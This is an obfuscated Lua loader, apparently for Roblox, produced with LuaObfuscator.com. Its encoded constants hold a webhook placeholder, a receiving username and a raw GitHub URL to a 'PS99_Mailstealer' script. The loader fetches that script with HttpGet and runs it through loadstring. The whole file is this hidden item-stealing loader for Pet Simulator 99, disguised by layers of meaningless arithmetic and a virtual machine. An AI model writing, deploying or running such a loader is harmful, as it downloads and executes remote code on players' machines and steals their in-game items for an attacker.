--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.7) ~  Much Love, Ferib 

]]--

local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 79) then
			v19 = v0(v3(v30, 1, 1));
			return "";
		else
			local v88 = v2(v0(v30, 16));
			if v19 then
				local v114 = v5(v88, v19);
				v19 = nil;
				return v114;
			else
				return v88;
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v89 = 0 - 0;
			local v90;
			while true do
				if (v89 == (0 - 0)) then
					v90 = (v31 / (2 ^ (v32 - (1 - 0)))) % ((4 - (1639 - (1523 + 114))) ^ (((v33 - (620 - (555 + 64))) - (v32 - (932 - (857 + 67 + 7)))) + 1));
					return v90 - (v90 % (569 - ((1432 - (68 + 997)) + 201)));
				end
			end
		else
			local v91 = (929 - ((1484 - (226 + 1044)) + 713)) ^ (v32 - (1 + 0));
			return (((v31 % (v91 + v91)) >= v91) and (1 + 0)) or (877 - (282 + 595));
		end
	end
	local function v21()
		local v34 = 0 - 0;
		local v35;
		while true do
			if (v34 == ((1075 - (892 + 65)) - ((75 - 43) + 85))) then
				return v35;
			end
			if (v34 == 0) then
				v35 = v1(v16, v18, v18);
				v18 = v18 + 1 + 0;
				v34 = 1 + 0;
			end
		end
	end
	local function v22()
		local v36 = 0;
		local v37;
		local v38;
		while true do
			if (v36 == ((719 - 538) - (67 + 113))) then
				return (v38 * ((1424 - (802 + 150)) - 216)) + v37;
			end
			if (v36 == (0 - 0)) then
				v37, v38 = v1(v16, v18, v18 + (4 - 2));
				v18 = v18 + (352 - (87 + 263));
				v36 = 1;
			end
		end
	end
	local function v23()
		local v39 = 0 + 0;
		local v40;
		local v41;
		local v42;
		local v43;
		while true do
			if (v39 == (1 - 0)) then
				return (v43 * (45169940 - 28392724)) + (v42 * (118879 - 53343)) + (v41 * ((587 - 400) + 69)) + v40;
			end
			if (v39 == (997 - ((933 - (10 + 8)) + 82))) then
				v40, v41, v42, v43 = v1(v16, v18, v18 + (8 - 5));
				v18 = v18 + 4 + 0;
				v39 = 792 - (368 + 423);
			end
		end
	end
	local function v24()
		local v44 = v23();
		local v45 = v23();
		local v46 = 3 - 2;
		local v47 = (v20(v45, (1866 - (630 + 793)) - ((1409 - 993) + 26), 63 - 43) * (((4 - 3) + 1) ^ ((23 + 33) - 24))) + v44;
		local v48 = v20(v45, 459 - (145 + (1008 - 715)), 1778 - (760 + 987));
		local v49 = ((v20(v45, 462 - (44 + (2299 - (1789 + 124)))) == ((2642 - 1155) - (998 + 488))) and -1) or (1 + 0);
		if (v48 == (0 + 0)) then
			if (v47 == (772 - (201 + 571))) then
				return v49 * (1138 - (116 + 1022));
			else
				local v115 = 0 - 0;
				while true do
					if (v115 == (0 + 0)) then
						v48 = 3 - 2;
						v46 = 0 - 0;
						break;
					end
				end
			end
		elseif (v48 == (2906 - (814 + (1125 - (1020 + 60))))) then
			return ((v47 == 0) and (v49 * ((2 - 1) / (0 + 0)))) or (v49 * NaN);
		end
		return v8(v49, v48 - 1023) * (v46 + (v47 / ((1 + 1) ^ (937 - ((1027 - (745 + 21)) + 624)))));
	end
	local function v25(v50)
		local v51;
		if not v50 then
			local v92 = (1055 - (87 + 968)) + (0 - 0);
			while true do
				if ((0 - 0) == v92) then
					v50 = v23();
					if (v50 == (0 - 0)) then
						return "";
					end
					break;
				end
			end
		end
		v51 = v3(v16, v18, (v18 + v50) - (1 + 0));
		v18 = v18 + v50;
		local v52 = {};
		for v68 = 1 + 0, #v51 do
			v52[v68] = v2(v1(v3(v51, v68, v68)));
		end
		return v6(v52);
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v53 = (function()
			return function(v93, v94, v95, v96, v97, v98, v99, v100)
				local v93 = (function()
					return 0;
				end)();
				local v94 = (function()
					return;
				end)();
				local v96 = (function()
					return;
				end)();
				while true do
					if ((0 + 0) == v93) then
						local v120 = (function()
							return 0 - 0;
						end)();
						local v121 = (function()
							return;
						end)();
						while true do
							if ((0 - 0) == v120) then
								v121 = (function()
									return 0;
								end)();
								while true do
									if ((241 - (187 + 54)) ~= v121) then
									else
										v94 = (function()
											return v95();
										end)();
										v96 = (function()
											return nil;
										end)();
										v121 = (function()
											return 781 - (162 + 618);
										end)();
									end
									if (v121 == (1 + 0)) then
										v93 = (function()
											return #",";
										end)();
										break;
									end
								end
								break;
							end
						end
					end
					if (v93 == #":") then
						if (v94 == #"}") then
							v96 = (function()
								return v95() ~= 0;
							end)();
						elseif (v94 == (2 + 0)) then
							v96 = (function()
								return v97();
							end)();
						elseif (v94 == #"xnx") then
							v96 = (function()
								return v98();
							end)();
						end
						v99[v100] = (function()
							return v96;
						end)();
						break;
					end
				end
				return v93, v94, v95, v96, v97, v98, v99, v100;
			end;
		end)();
		local v54 = (function()
			return function(v101, v102, v103)
				local v104 = (function()
					return 0 - 0;
				end)();
				local v105 = (function()
					return;
				end)();
				while true do
					if (v104 ~= 0) then
					else
						v105 = (function()
							return 0;
						end)();
						while true do
							if (v105 == 0) then
								v101[v102 - #"~"] = (function()
									return v103();
								end)();
								return v101, v102, v103;
							end
						end
						break;
					end
				end
			end;
		end)();
		local v55 = (function()
			return {};
		end)();
		local v56 = (function()
			return {};
		end)();
		local v57 = (function()
			return {};
		end)();
		local v58 = (function()
			return {v55,v56,nil,v57};
		end)();
		local v59 = (function()
			return v23();
		end)();
		local v60 = (function()
			return {};
		end)();
		for v70 = #"~", v59 do
			FlatIdent_43862, Type, v21, Cons, v24, v25, v60, v70 = (function()
				return v53(FlatIdent_43862, Type, v21, Cons, v24, v25, v60, v70);
			end)();
		end
		v58[#"19("] = (function()
			return v21();
		end)();
		for v71 = #"~", v23() do
			local v72 = (function()
				return v21();
			end)();
			if (v20(v72, #"~", #"{") == (0 + 0)) then
				local v109 = (function()
					return 0;
				end)();
				local v110 = (function()
					return;
				end)();
				local v111 = (function()
					return;
				end)();
				local v112 = (function()
					return;
				end)();
				local v113 = (function()
					return;
				end)();
				while true do
					if (2 == v109) then
						while true do
							if (v110 == #"nil") then
								if (v20(v112, #"-19", #"-19") ~= #":") then
								else
									v113[#".dev"] = (function()
										return v60[v113[#"xnxx"]];
									end)();
								end
								v55[v71] = (function()
									return v113;
								end)();
								break;
							end
							if (#"[" == v110) then
								local v132 = (function()
									return 1636 - (1373 + 263);
								end)();
								local v133 = (function()
									return;
								end)();
								while true do
									if (v132 == 0) then
										v133 = (function()
											return 1000 - (451 + 549);
										end)();
										while true do
											if (v133 ~= 0) then
											else
												v113 = (function()
													return {v22(),v22(),nil,nil};
												end)();
												if (v111 == 0) then
													local v194 = (function()
														return 0;
													end)();
													local v195 = (function()
														return;
													end)();
													while true do
														if (v194 == 0) then
															v195 = (function()
																return 0 + 0;
															end)();
															while true do
																if ((0 - 0) == v195) then
																	v113[#"-19"] = (function()
																		return v22();
																	end)();
																	v113[#"xnxx"] = (function()
																		return v22();
																	end)();
																	break;
																end
															end
															break;
														end
													end
												elseif (v111 == #"\\") then
													v113[#"91("] = (function()
														return v23();
													end)();
												elseif (v111 == (2 - 0)) then
													v113[#"asd"] = (function()
														return v23() - ((1386 - (746 + 638)) ^ (7 + 9));
													end)();
												elseif (v111 == #"91(") then
													local v202 = (function()
														return 0;
													end)();
													local v203 = (function()
														return;
													end)();
													while true do
														if (v202 ~= (0 - 0)) then
														else
															v203 = (function()
																return 341 - (218 + 123);
															end)();
															while true do
																if (v203 == (1581 - (1535 + 46))) then
																	v113[#"-19"] = (function()
																		return v23() - ((2 + 0) ^ (3 + 13));
																	end)();
																	v113[#".com"] = (function()
																		return v22();
																	end)();
																	break;
																end
															end
															break;
														end
													end
												end
												v133 = (function()
													return 1;
												end)();
											end
											if (v133 == (561 - (306 + 254))) then
												v110 = (function()
													return 1 + 1;
												end)();
												break;
											end
										end
										break;
									end
								end
							end
							if ((3 - 1) == v110) then
								local v134 = (function()
									return 0;
								end)();
								local v135 = (function()
									return;
								end)();
								while true do
									if ((1467 - (899 + 568)) == v134) then
										v135 = (function()
											return 0 + 0;
										end)();
										while true do
											if (v135 ~= 1) then
											else
												v110 = (function()
													return #"gha";
												end)();
												break;
											end
											if (v135 == (0 - 0)) then
												if (v20(v112, #",", #"<") ~= #".") then
												else
													v113[2] = (function()
														return v60[v113[2]];
													end)();
												end
												if (v20(v112, 605 - (268 + 335), 2) == #"/") then
													v113[#"xnx"] = (function()
														return v60[v113[#"nil"]];
													end)();
												end
												v135 = (function()
													return 291 - (60 + 230);
												end)();
											end
										end
										break;
									end
								end
							end
							if (v110 ~= 0) then
							else
								local v136 = (function()
									return 0;
								end)();
								while true do
									if (v136 == (572 - (426 + 146))) then
										v111 = (function()
											return v20(v72, 2, #"gha");
										end)();
										v112 = (function()
											return v20(v72, #"http", 6);
										end)();
										v136 = (function()
											return 1;
										end)();
									end
									if (v136 == 1) then
										v110 = (function()
											return #"\\";
										end)();
										break;
									end
								end
							end
						end
						break;
					end
					if (0 ~= v109) then
					else
						local v123 = (function()
							return 0 + 0;
						end)();
						local v124 = (function()
							return;
						end)();
						while true do
							if (v123 ~= 0) then
							else
								v124 = (function()
									return 1456 - (282 + 1174);
								end)();
								while true do
									if (v124 == 1) then
										v109 = (function()
											return 1;
										end)();
										break;
									end
									if ((811 - (569 + 242)) == v124) then
										v110 = (function()
											return 0 - 0;
										end)();
										v111 = (function()
											return nil;
										end)();
										v124 = (function()
											return 1 + 0;
										end)();
									end
								end
								break;
							end
						end
					end
					if (v109 == (1025 - (706 + 318))) then
						local v125 = (function()
							return 0;
						end)();
						while true do
							if (1 ~= v125) then
							else
								v109 = (function()
									return 1253 - (721 + 530);
								end)();
								break;
							end
							if (v125 == (1271 - (945 + 326))) then
								v112 = (function()
									return nil;
								end)();
								v113 = (function()
									return nil;
								end)();
								v125 = (function()
									return 1;
								end)();
							end
						end
					end
				end
			end
		end
		for v73 = #".", v23() do
			v56, v73, v28 = (function()
				return v54(v56, v73, v28);
			end)();
		end
		return v58;
	end
	local function v29(v62, v63, v64)
		local v65 = v62[2 - 1];
		local v66 = v62[3 - 1];
		local v67 = v62[3 + 0];
		return function(...)
			local v74 = v65;
			local v75 = v66;
			local v76 = v67;
			local v77 = v27;
			local v78 = 701 - (271 + 429);
			local v79 = -(1 + 0);
			local v80 = {};
			local v81 = {...};
			local v82 = v12("#", ...) - (1501 - (1408 + 92));
			local v83 = {};
			local v84 = {};
			for v106 = 0, v82 do
				if (v106 >= v76) then
					v80[v106 - v76] = v81[v106 + ((1527 - (382 + 58)) - (461 + 625))];
				else
					v84[v106] = v81[v106 + (2 - 1)];
				end
			end
			local v85 = (v82 - v76) + (1289 - (993 + 295));
			local v86;
			local v87;
			while true do
				v86 = v74[v78];
				v87 = v86[1 + 0];
				if ((v87 <= (11 - 6)) or (3315 <= 2782)) then
					if ((v87 <= (1173 - (418 + 753))) or (876 >= 2964)) then
						if (v87 <= 0) then
							v64[v86[2 + 1]] = v84[v86[1 + 1]];
						elseif (v87 > (1 + 0)) then
							local v137 = v86[1 + 1];
							local v138 = v84[v86[1 + 2]];
							v84[v137 + (530 - (406 + 123))] = v138;
							v84[v137] = v138[v86[1773 - (1749 + 20)]];
						else
							local v142 = 0 + 0;
							local v143;
							local v144;
							local v145;
							local v146;
							while true do
								if (v142 == (1322 - (1249 + 73))) then
									v143 = v86[1 + 1];
									v144, v145 = v77(v84[v143](v13(v84, v143 + (1146 - (466 + 679)), v86[6 - 3])));
									v142 = 2 - 1;
								end
								if ((v142 == ((3628 - 2497) - (369 + 761))) or (2232 > 2497)) then
									v79 = (v145 + v143) - (1901 - (106 + 1794));
									v146 = 0 + 0;
									v142 = 1 + 1;
								end
								if (v142 == ((5 + 0) - 3)) then
									for v191 = v143, v79 do
										v146 = v146 + (2 - (1 - 0));
										v84[v191] = v144[v146];
									end
									break;
								end
							end
						end
					elseif (v87 <= ((347 - 230) - (4 + 110))) then
						v84[v86[586 - (57 + 527)]]();
					elseif (v87 > (220 - (42 + 174))) then
						local v147;
						local v148, v149;
						local v150;
						local v151;
						v64[v86[(2635 - (902 + 303)) - (41 + 1386)]] = v84[v86[105 - (17 + 86)]];
						v78 = v78 + 1 + (0 - 0);
						v86 = v74[v78];
						v84[v86[3 - 1]] = v64[v86[1507 - (363 + 1141)]];
						v78 = v78 + (2 - (2 - 1));
						v86 = v74[v78];
						v84[v86[1582 - (1183 + 397)]] = v64[v86[169 - (122 + 44)]];
						v78 = v78 + 1;
						v86 = v74[v78];
						v151 = v86[2 - (0 + 0)];
						v150 = v84[v86[9 - 6]];
						v84[v151 + 1 + 0] = v150;
						v84[v151] = v150[v86[(1691 - (1121 + 569)) + 3]];
						v78 = v78 + (1976 - (1913 + 62));
						v86 = v74[v78];
						v84[v86[3 - 1]] = v86[7 - 4];
						v78 = v78 + (66 - (30 + 35));
						v86 = v74[v78];
						v151 = v86[7 - 5];
						v148, v149 = v77(v84[v151](v13(v84, v151 + 1 + 0, v86[1664 - (1477 + 184)])));
						v79 = (v149 + v151) - (1258 - (1043 + 214));
						v147 = 0 - 0;
						for v184 = v151, v79 do
							v147 = v147 + (1213 - (323 + 889));
							v84[v184] = v148[v147];
						end
						v78 = v78 + (2 - 1);
						v86 = v74[v78];
						v151 = v86[(796 - (22 + 192)) - ((1044 - (483 + 200)) + 219)];
						v84[v151] = v84[v151](v13(v84, v151 + (1 - 0), v79));
						v78 = v78 + (321 - (53 + (1730 - (1404 + 59))));
						v86 = v74[v78];
						v84[v86[306 - (244 + 60)]]();
						v78 = v78 + (2 - 1) + 0;
						v86 = v74[v78];
						v78 = v86[1 + 2];
					else
						v64[v86[1004 - (938 + 63)]] = v84[v86[415 - (15 + 398)]];
						v78 = v78 + (983 - (18 + 964));
						v86 = v74[v78];
						v84[v86[1127 - (936 + 189)]] = v86[1 + 2] ~= (0 - 0);
						v78 = v78 + (1 - 0) + 0;
						v86 = v74[v78];
						v64[v86[(767 - (468 + 297)) + 1]] = v84[v86[852 - (20 + (1392 - (334 + 228)))]];
						v78 = v78 + 1 + 0;
						v86 = v74[v78];
						v84[v86[128 - (116 + 10)]] = v86[1 + 2];
						v78 = v78 + ((3686 - 2593) - (975 + 117));
						v86 = v74[v78];
						v78 = v86[(1717 - 976) - (542 + 196)];
					end
				elseif ((v87 <= ((12 - 5) + 1)) or (2110 <= 332)) then
					if (v87 <= (21 - 15)) then
						local v129 = 0 - 0;
						local v130;
						while true do
							if (v129 == (0 - 0)) then
								v130 = v86[1 + 1 + 0];
								v84[v130] = v84[v130](v13(v84, v130 + 1 + 0, v79));
								break;
							end
						end
					elseif ((3686 > 3172) and (v87 > (15 - 8))) then
						if (v84[v86[1 + 1]] == v86[10 - 6]) then
							v78 = v78 + ((238 - (141 + 95)) - (1 + 0));
						else
							v78 = v86[1554 - (1126 + 425)];
						end
					else
						v78 = v86[408 - (118 + 287)];
					end
				elseif ((v87 <= (621 - (602 + 9))) or (4474 < 820)) then
					if (v87 == (35 - 26)) then
						v84[v86[1123 - ((303 - 185) + 1003)]] = v86[3];
					else
						v84[v86[(12 - 7) - 3]] = v86[950 - (245 + 702)] ~= (377 - (142 + 235));
					end
				elseif ((4279 >= 2882) and (v87 > (49 - 38))) then
					v84[v86[1 + 0 + 1]] = v64[v86[(2685 - 1705) - (389 + 164 + 424)]];
				else
					do
						return;
					end
				end
				v78 = v78 + ((989 + 910) - ((366 - 106) + 1638));
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!0B3O00028O00026O00F03F03073O00576562682O6F6B030E3O00596F7572204C696E6B2048657265030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034D3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4B692O75502F50532O395F4D61696C737465616C65722F6D61696E2F4D61696C537465616C65722E6C756103083O00557365726E616D65030C3O004361637469476F64426F7431030A3O004C6F61645363722O656E001E3O0012093O00013O0026083O000D000100020004073O000D0001001209000100043O001205000100033O00122O000100053O00122O000200063O00202O00020002000700122O000400086O000200046O00013O00024O00010001000100044O001D00010026083O0001000100010004073O00010001001209000100013O00260800010014000100020004073O001400010012093O00023O0004073O0001000100260800010010000100010004073O001000010012090002000A3O001204000200096O000200013O00122O0002000B3O00122O000100023O00044O001000010004073O000100012O000B3O00017O00", v9(), ...);